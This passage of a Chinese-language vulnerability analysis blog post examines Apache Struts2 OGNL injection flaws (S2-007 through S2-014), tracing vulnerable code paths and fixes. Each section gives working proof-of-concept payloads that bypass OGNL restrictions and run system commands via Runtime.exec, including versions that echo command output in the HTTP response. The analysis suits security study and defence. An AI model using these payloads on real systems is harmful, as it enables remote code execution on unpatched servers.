<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a><span class=p>(</span><span class=n>e</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023dis</span><span class=p>.</span><span class=na>readFully</span><span class=p>(</span><span class=err>\</span><span class=n>u0023res</span><span class=p>)</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a><span class=p>(</span><span class=n>f</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=p>().</span><span class=na>getWriter</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a><span class=p>(</span><span class=n>g</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=k>new</span><span class=err>\</span><span class=n>u0020java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>(</span><span class=err>\</span><span class=n>u0023res</span><span class=p>))</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w> </span><span class=c1>// 获取response，回显数据</span><span class=w></span>
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a><span class=p>(</span><span class=n>h</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=p>.</span><span class=na>flush</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a><span class=p>(</span><span class=n>i</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=p>.</span><span class=na>close</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=w></span>
</code></pre></div> <p>这里使用了<code>@org.apache.struts2.ServletActionContext@getResponse()</code>静态方法来获取response</p> <h4 id=_5>修复</h4> <p>xwork&gt;=2.2.1.1，对参数名做了更为细致的正则检查<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+</code></p> <h3 id=4-s2-007>4. S2-007</h3> <p>这里跟S2-008里面的第一个漏洞一样</p> <p><code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept</code></p> <p><img alt=image-20200509111903026 src=/images/talk_about_struts2/image-20200509111903026.png></p> <p>value为我们传入的数据，过了一次getOverrideExpr</p> <p><img alt=image-20200509111939166 src=/images/talk_about_struts2/image-20200509111939166.png></p> <p>对我们的输入围上了单引号，这里如果我们的payload为<code>'+xxxx+'</code>，这里的xxxx就逃逸出来了，而不单单是字符串了</p> <p><img alt=image-20200509112218065 src=/images/talk_about_struts2/image-20200509112218065.png></p> <p>后续将处理好的数据放到了stack的overrides里面</p> <p>而实际触发的地方跟S2-001一样，是在解析JSP的时候造成的</p> <p><img src=/images/talk_about_struts2/image-20200509114347567.png alt=image-20200509114347567 style=zoom:50%;></p> <p>在<code>tryFIndValue</code>函数中，从stack的overrides中取出前面加了单引号的数据，并在后续调用<code>Ognl.getValue</code>，导致了Ognl表达式的执行。</p> <h4 id=poc_3>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=err>&#39;</span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=p>.</span><span class=na>allowStaticMethodAccess</span><span class=o>=</span><span class=kc>true</span><span class=p>,</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=p>,</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>open</span><span class=w> </span><span class=o>/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>&#39;</span><span class=p>))</span><span class=w> </span><span class=o>+</span><span class=err>&#39;</span><span class=w></span>
</code></pre></div> <p>xwork&gt;=2.2.3，ognl表达式计算时，调用函数的函数判断<code>isAcceptableProperty</code>如果name为null直接返回true，所以我们不用像s2-005那样把<code>excludeProperties</code>置为空集合。</p> <p><img alt=image-20200509120444634 src=/images/talk_about_struts2/image-20200509120444634.png></p> <p>但是从这里开始，<code>allowStaticMethodAccess</code>默认为false，我们需要将其置为true，才能正常执行静态函数。</p> <p>所以POC第一二句都是在解除限制，第三句执行命令</p> <p>写一下回显的POC</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=err>&#39;</span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=w></span>
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a><span class=err>#</span><span class=n>_memberAccess</span><span class=p>.</span><span class=na>allowStaticMethodAccess</span><span class=o>=</span><span class=kc>true</span><span class=p>,</span><span class=w></span>
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=p>,</span><span class=w></span>
<a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a><span class=err>#</span><span class=n>ret</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>),</span><span class=w></span>
<a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a><span class=err>#</span><span class=n>isr</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>InputStreamReader</span><span class=p>(</span><span class=err>#</span><span class=n>ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()),</span><span class=w></span>
<a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a><span class=err>#</span><span class=n>br</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=p>(</span><span class=err>#</span><span class=n>isr</span><span class=p>),</span><span class=w></span>
<a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a><span class=err>#</span><span class=n>res</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=kt>char</span><span class=o>[</span><span class=mi>2000</span><span class=o>]</span><span class=p>,</span><span class=w></span>
<a id=__codelineno-9-8 name=__codelineno-9-8 href=#__codelineno-9-8></a><span class=err>#</span><span class=n>br</span><span class=p>.</span><span class=na>read</span><span class=p>(</span><span class=err>#</span><span class=n>res</span><span class=p>),</span><span class=w></span>
<a id=__codelineno-9-9 name=__codelineno-9-9 href=#__codelineno-9-9></a><span class=err>#</span><span class=n>writer</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>com</span><span class=p>.</span><span class=na>opensymphony</span><span class=p>.</span><span class=na>xwork2</span><span class=p>.</span><span class=na>dispatcher</span><span class=p>.</span><span class=na>HttpServletResponse</span><span class=err>&#39;</span><span class=o>]</span><span class=p>.</span><span class=na>getWriter</span><span class=p>(),</span><span class=w></span>
<a id=__codelineno-9-10 name=__codelineno-9-10 href=#__codelineno-9-10></a><span class=err>#</span><span class=n>writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>(</span><span class=err>#</span><span class=n>res</span><span class=p>)),</span><span class=w></span>
<a id=__codelineno-9-11 name=__codelineno-9-11 href=#__codelineno-9-11></a><span class=err>#</span><span class=n>writer</span><span class=p>.</span><span class=na>flush</span><span class=p>(),</span><span class=w></span>
<a id=__codelineno-9-12 name=__codelineno-9-12 href=#__codelineno-9-12></a><span class=err>#</span><span class=n>writer</span><span class=p>.</span><span class=na>close</span><span class=p>()</span><span class=w></span>
<a id=__codelineno-9-13 name=__codelineno-9-13 href=#__codelineno-9-13></a><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=err>&#39;</span><span class=w></span>
</code></pre></div> <h3 id=5-s2-008>5. S2-008</h3> <p>S2-008一共有4个漏洞，详细看https://cwiki.apache.org/confluence/display/WW/S2-008</p> <p>其中1跟S2-007类似，3不看了，主要关注2和4</p> <h4 id=cookieinterceptor>CookieInterceptor</h4> <p>这里的原理同S2-005类似，这里看代码比较直观，没有搭环境调了</p> <p><code>org.apache.struts2.interceptor.CookieInterceptor#intercept</code></p> <p><img alt=image-20200509202547849 src=/images/talk_about_struts2/image-20200509202547849.png></p> <p><img alt=image-20200509202741614 src=/images/talk_about_struts2/image-20200509202741614.png></p> <p>这里会到<code>OgnlValueStack.setValue</code>，也就是后续调用<code>Ognl.setValue</code>，用<code>((1)(2))(3)</code>的方式来执行任意OGNL表达式</p> <h4 id=debugginginterceptor>DebuggingInterceptor</h4> <p><img alt=image-20200509204915751 src=/images/talk_about_struts2/image-20200509204915751.png></p> <p>当开启开发者模式时，传入<code>debug=command&amp;expression=xxxx</code>，即可执行OGNL表达式</p> <h4 id=poc_4>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=o>?</span><span class=n>debug</span><span class=o>=</span><span class=n>command</span><span class=o>&amp;</span><span class=n>expression</span><span class=o>=</span><span class=p>(</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=p>.</span><span class=na>allowStaticMethodAccess</span><span class=o>=</span><span class=kc>true</span><span class=p>,</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>open</span><span class=w> </span><span class=o>/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>&#39;</span><span class=p>))</span><span class=w></span>
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a><span class=c1>// 回显POC</span><span class=w></span>
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=p>(</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=p>.</span><span class=na>allowStaticMethodAccess</span><span class=o>=</span><span class=kc>true</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>isr</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>InputStreamReader</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()),</span><span class=o>%</span><span class=mi>23</span><span class=n>br</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>isr</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=kt>char</span><span class=o>[</span><span class=mi>2000</span><span class=o>]</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>br</span><span class=p>.</span><span class=na>read</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=p>),</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=p>))</span><span class=w></span>
</code></pre></div> <h3 id=6-s2-009>6. <a href=https://cwiki.apache.org/confluence/display/WW/S2-009>S2-009</a></h3> <p>影响范围：2.0.0 - 2.3.1.1</p> <p>针对S2-005的修复，对参数做<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+</code>正则检查，这里规避了参数名中出现<code>#</code>、unicode编码等</p> <p>S2-009是对S2-005的绕过，这里用的就是<code>Ognl.setValue</code>函数的另一种用法<code>a[(1)(2)]</code>，还有一个比较巧妙的是，前面的几个漏洞利用，我们都是直接在<code>(1)</code>写上要执行的OGNL表达式，而S2-009则通过context里的内容来进行一个中转，将OGNL表达式放到<code>key=value</code>的value的位置，再由<code>a[(key)(2)]</code>的方式去执行value的内容。</p> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=n>OgnlContext</span><span class=w> </span><span class=n>context</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>OgnlContext</span><span class=p>();</span><span class=w></span>
<a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a><span class=n>context</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&quot;test&quot;</span><span class=p>,</span><span class=s>&quot;@java.lang.Runtime@getRuntime().exec(\&#39;open /System/Applications/Calculator.app/\&#39;)&quot;</span><span class=p>);</span><span class=w> </span><span class=c1>// 假设context存在执行系统命令的OGNL表达式test</span><span class=w></span>
<a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a><span class=n>Ognl</span><span class=p>.</span><span class=na>setValue</span><span class=p>(</span><span class=s>&quot;a[(test)(bla)]&quot;</span><span class=p>,</span><span class=n>context</span><span class=p>,</span><span class=s>&quot;&quot;</span><span class=p>);</span><span class=c1>// 以a[(test)(bla)],执行test所代表的OGNL表达式</span><span class=w></span>
</code></pre></div> <p>上面代码中的假设，我们可以通过传入<code>?param=xxx</code>的方式带入</p> <p>注意这里的param需要是当前Action的一个类属性（也就是原本就存在的参数名），比如原本表单里就有password，那么你就可以在password里面填充OGNL表达式</p> <p>因为在计算OGNL表达式<code>(password)(bla)</code>的时候(解析出两个ASTProperty)</p> <p><img alt=image-20200511171450014 src=/images/talk_about_struts2/image-20200511171450014.png></p> <p>后续再执行过程中，会去查找当前的action里面是否含有这个属性</p> <p><img alt=image-20200511171056619 src=/images/talk_about_struts2/image-20200511171056619.png></p> <p><code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty</code></p> <p><img alt=image-20200511204523185 src=/images/talk_about_struts2/image-20200511204523185.png></p> <p>如果当前存在这个属性的时候，返回其内容</p> <p>后续就是跟<code>(1)(2)</code>这种执行的原理一样，会以<code>(1)</code>作为node调用getValue。</p> <p>这里巧妙的就是利用这种中转的方式，规避了参数名的正则检测</p> <h4 id=poc_5>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=o>?</span><span class=n>password</span><span class=o>=</span><span class=p>(</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=p>.</span><span class=na>allowStaticMethodAccess</span><span class=o>=</span><span class=kc>true</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=p>,</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>open</span><span class=w> </span><span class=o>/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>&#39;</span><span class=p>))</span><span class=o>&amp;</span><span class=n>z</span><span class=o>[</span><span class=p>(</span><span class=n>password</span><span class=p>)(</span><span class=n>bla</span><span class=p>)</span><span class=o>]=</span><span class=mi>1</span><span class=w></span>
<a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a><span class=c1>// 回显POC</span><span class=w></span>
<a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a><span class=o>?</span><span class=n>password</span><span class=o>=</span><span class=p>(</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=p>.</span><span class=na>allowStaticMethodAccess</span><span class=o>=</span><span class=kc>true</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>isr</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>InputStreamReader</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()),</span><span class=o>%</span><span class=mi>23</span><span class=n>br</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>isr</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=kt>char</span><span class=o>[</span><span class=mi>2000</span><span class=o>]</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>br</span><span class=p>.</span><span class=na>read</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=o>=</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=p>().</span><span class=na>getWriter</span><span class=p>(),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=p>)),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=p>.</span><span class=na>flush</span><span class=p>(),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=p>.</span><span class=na>close</span><span class=p>())</span><span class=o>&amp;</span><span class=n>z</span><span class=o>[</span><span class=p>(</span><span class=n>password</span><span class=p>)(</span><span class=n>bla</span><span class=p>)</span><span class=o>]=</span><span class=mi>1</span><span class=w></span>
</code></pre></div> <h4 id=_6>修复</h4> <p>改进了正则</p> <p><img alt=image-20200511222139049 src=/images/talk_about_struts2/image-20200511222139049.png></p> <p>增加了<code>setParameter</code>函数，默认设置表达式不可执行</p> <p><img alt=image-20200511223638532 src=/images/talk_about_struts2/image-20200511223638532.png></p> <p><img alt=image-20200519154216690 src=/images/talk_about_struts2/image-20200519154216690.png></p> <h3 id=7-s2-012>7. S2-012</h3> <p>影响范围：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2</p> <blockquote> <p>The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter. This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.</p> </blockquote> <p>看描述可以知道是struts2在处理redirect的时候出现的问题。</p> <p><img alt=image-20200513145252050 src=/images/talk_about_struts2/image-20200513145252050.png></p> <p><img alt=image-20200513145417046 src=/images/talk_about_struts2/image-20200513145417046.png></p> <p>结果返回后回去调用<code>ServletRedirectResult</code>来处理</p> <p>来看看该对象的实际处理函数<code>org.apache.struts2.dispatcher.ServletRedirectResult#execute</code></p> <p><img alt=image-20200513145546225 src=/images/talk_about_struts2/image-20200513145546225.png></p> <p><img alt=image-20200513150115678 src=/images/talk_about_struts2/image-20200513150115678.png></p> <p>在父类execute函数调用了<code>conditionalParse</code>函数</p> <p><img alt=image-20200513150240332 src=/images/talk_about_struts2/image-20200513150240332.png></p> <p>这里出现了我们比较熟悉的<code>TextParseUtil.translateVariables</code>，S2-001就是由这个函数来处理String类型转化的。</p> <p>此时param为我们在struts.xml中的配置<code>edit.action?skillName=${currentSkill.name}</code></p> <p>前面分析过<code>translateVariables</code>，这里直切主题</p> <p>出问题的地方跟S2-001一样</p> <p><img alt=image-20200513151342610 src=/images/talk_about_struts2/image-20200513151342610.png></p> <p>触发总共分为两步：</p> <ol> <li>将xml配置中<code>${currentSkill.name}</code>解析成传入的值，此时stack.findValue会去找到前面处理好后的Result里面的currentSkill.name的值</li> </ol> <p><img alt=image-20200513151651915 src=/images/talk_about_struts2/image-20200513151651915.png></p> <ol> <li>由于<code>translateVariables</code>的解析OGNL表达式有两种<code>$</code>、<code>%</code>，并且是循环去处理的</li> </ol> <p><img alt=image-20200513151842698 src=/images/talk_about_struts2/image-20200513151842698.png></p> <p>首先是去处理<code>$</code>，将<code>${currentSkill.name}</code>解析成具体的值，并且将result的值置为他的内容</p> <p>虽然已经修复了循环递归执行的问题(s2-001会执行两层<code>${}</code>)，但是因为还循环去处理<code>%</code>，那么仍然可以达到循环递归计算的效果<code>${另一层以%起始的ognl表达式}</code>，所以POC里面需要用<code>%{}</code>来写入OGNL表达式</p> <p>所以对于S2-012来说，配置中<code>${currentSkill.name}</code>是至关重要的</p> <h4 id=_7>修复</h4> <p>由于我前面分析的是<code>2.2.3</code>版本，后续的版本的<code>translateVariables</code>变化有点大，其修复版本</p> <p><img alt=image-20200513155116772 src=/images/talk_about_struts2/image-20200513155116772.png></p> <p>增加了pos来做起始位置来查找<code>${}%{}</code>，在第一次表达式执行完成后会更新pos值，来防止二次OGNL表达式执行</p> <h4 id=poc_6>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a>currentSkill.name=%{(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,@java.lang.Runtime@getRuntime().exec(&#39;open /System/Applications/Calculator.app&#39;))}
<a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a>// 回显POC
<a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a>%{(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())}
</code></pre></div> <h3 id=8-s2-013s2-014>8. S2-013/S2-014</h3> <p>影响范围：Struts 2.0.0 - Struts 2.3.14.1</p> <p>这次的原理跟S2-001类似，只是问题出在解析<code>&lt;s:a&gt;</code>、<code>&lt;s:url&gt;</code>，当这两个标签支持<code>includeParams</code></p> <p><img alt=image-20200514151446611 src=/images/talk_about_struts2/image-20200514151446611.png></p> <p>当当前的href为空时，会用当前url来填充href，也就是在<code>buildUrl</code>时导致的OGNL表达式的执行</p> <p>这里不具体分析了，看一下他的执行栈</p> <p><img src=/images/talk_about_struts2/image-20200514150911888.png alt=image-20200514150911888 style=zoom:50%;></p> <p><code>org.apache.struts2.views.util.DefaultUrlHelper#translateVariable</code></p> <p><img alt=image-20200514151844894 src=/images/talk_about_struts2/image-20200514151844894.png></p> <p>也同样是使用String转换时出现的OGNL表达式执行</p> <h4 id=poc_7>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=o>?</span><span class=n>fakeParam</span><span class=o>=%</span><span class=p>{(</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=o>[</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>true</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=p>,</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>open</span><span class=w> </span><span class=o>/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>&#39;</span><span class=p>))}</span><span class=w></span>
<a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a><span class=c1>// 回显POC</span><span class=w></span>
<a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a><span class=o>?</span><span class=n>fakeParam</span><span class=o>=%</span><span class=p>{(</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=o>[</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>true</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>isr</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>InputStreamReader</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()),</span><span class=o>%</span><span class=mi>23</span><span class=n>br</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>isr</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=kt>char</span><span class=o>[</span><span class=mi>2000</span><span class=o>]</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>br</span><span class=p>.</span><span class=na>read</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=p>),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=o>=</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=p>().</span><span class=na>getWriter</span><span class=p>(),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>res</span><span class=p>)),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=p>.</span><span class=na>flush</span><span class=p>(),</span><span class=o>%</span><span class=mi>23</span><span class=n>writer</span><span class=p>.</span><span class=na>close</span><span class=p>())}</span><span class=w></span>
